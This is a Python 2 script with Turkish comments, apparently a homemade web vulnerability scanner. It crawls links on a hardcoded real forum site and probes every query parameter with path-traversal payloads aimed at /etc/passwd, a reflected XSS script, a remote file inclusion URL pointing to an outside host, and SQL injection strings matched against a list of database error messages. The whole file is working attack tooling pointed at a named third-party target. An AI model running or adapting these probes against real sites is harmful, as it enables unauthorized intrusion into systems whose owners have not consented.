__author__ = 'furkanb'

from sgmllib import SGMLParser
import sys, urllib, httplib, re, urllib2, sets, socket

#LFI Acigi kodu
LFI = "../../../../../../../../../../../../etc/passwd"

#XSS Acik test kodu
XSS = "%22%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"

#RFI Shell Txt
RFI = "http://furkanbahceci.com/rfi.txt?"

#SQL Hatalari DENE
SQLHatalari = {'MySQL': 'error in your SQL syntax',
               'Oracle': 'ORA-01756',
               'MiscError': 'SQL Error',
               'MiscError2': 'mysql_fetch_row',
               'MiscError3': 'num_rows',
               'JDBC_CFM': 'Error Executing Database Query',
               'JDBC_CFM2': 'SQLServer JDBC Driver',
               'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
               'MSSQL_Uqm': 'Unclosed quotation mark',
               'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
               'MS-Access_JETdb': 'Microsoft JET Database'}

#Sql test edilecek karakterler
SQL = ["-1","999999","'"]


site = "http://forum.donanimhaber.com/"


#HREF elementlerini getiriyor
class URLLister(SGMLParser):
   def reset(self):
      SGMLParser.reset(self)
      self.urls = []

   def start_a(self, attrs):
      href = [v for k, v in attrs if k=='href']
      if href:
         self.urls.extend(href)

#Gelen linkteki = 'den sonrasini kaldir
def parse_urls(links):
    urls = []
    for link in links:
        num = link.count("=")
        if num>0:
            for x in xrange(num):
                x = x+1
                if(link[0] == "/" or link[0] == "?"):
                    url = site+link.rsplit("=",x)[0]+"="
                else:
                    url = link.rsplit("=",x)[0]+"="
                if url.find(site.split(".",1)[1]) == -1:
                    url = site+url
                if url.count("//") > 1:
                    url = "http://"+url[7:].replace("//","/",1)
                urls.append(url)
    urls = list(sets.Set(urls))
    return urls

def tara(host):
    print "Test ediliyor = ", host

    #Tara
    lfiAra(host)
    xssAra(host)
    rfiAra(host)
    sql(host)

################TESTLER#######################
#LFI Ara
def lfiAra(host):
    urltest = urllib.urlopen(host+LFI).read()


    if re.search("root", urltest):
        print "LFI Bulundu: ", host+LFI
    else:
        print "LFI [-]"

    urltest = urllib.urlopen(host+LFI+"%00").read()
    if re.search("root", urltest):
        print "LFI Bulundu: ", host+LFI
    else:
        print "LFI %00 [-]"

#XSS Ara
def xssAra(host):
    urltest = urllib.urlopen(host+XSS).read()

    if re.search("XSS", urltest) != None:
        print "XSS Bulundu: ", host+XSS
    else:
        print "XSS [-]"

#RFI Ara
def rfiAra(host):
    urltest = urllib.urlopen(host+RFI).read()

    if re.search("RFITEST", urltest):
        print "RFI BULUNDU: ",host+RFI
    else:
        print "RFI [-]"

#SQL Injection
def sql(host):
    for pload in SQL:
        urltest = urllib.urlopen(host+pload).read()
        if re.search("Warning:", urltest) != None:
            print "SQL Bulundu : ",host+pload
        else:
            print " SQL ", pload," SQL [-]"

##############################################

#Baglanti sagla
try:
    print("Site ismi = " ,site)
    usock = urllib.urlopen(site)
    ayirici = URLLister()
    ayirici.feed(usock.read().lower())
    ayirici.close()
    usock.close()
except(), msg:
   print "Baglanti Hatasi",msg

urls = parse_urls(ayirici.urls)
print "Uyumlu Bulunan URL Sayisi = ",len(urls)

#Uyumlu url'leri test et
for url in urls:
    print("Uyumlu = ",url)
    tara(url)
